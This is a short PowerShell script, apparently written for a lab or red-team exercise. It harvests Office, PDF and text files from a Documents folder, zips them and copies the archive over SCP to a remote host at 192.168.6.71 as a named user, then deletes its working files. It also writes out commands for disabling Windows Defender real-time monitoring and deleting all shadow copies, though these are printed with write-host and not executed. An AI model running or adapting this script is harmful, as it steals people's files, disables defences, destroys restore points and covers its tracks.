# Disable Windows Defender and Delete restore points
write-host Set-MpPreference -DisableRealtimeMonitoring $true
write-host vssadmin delete shadows /all

Get-ChildItem -Recurse -Include *.docx,*.pdf,*.txt,*.xlsx -Path .\Documents | Export-Csv `
-Path .\files.csv

# Import the csv
$fileList = Import-Csv .\files.csv -Header FullName
mkdir .\Secret_Documents\ 

# Loop through the results
foreach ($f in $fileList) {
    # Copy files to Secret_Documents
    Copy-Item $f.FullName -Destination .\Secret_Documents
}

# Compress the files
Compress-Archive -Path .\Secret_Documents -DestinationPath .\Documents.zip

# Copy files
Set-SCPItem -ComputerName '192.168.6.71' -Credential (Get-Credential abijah.buttendorf) -Port '2222' `
-Destination '/home/abijah.buttendorf' -Path './Documents.zip'

#Cleanup
Remove-Item .\Secret_Documents -Force -Recurse
Remove-Item .\Documents.zip
Remove-Item .\files.csv
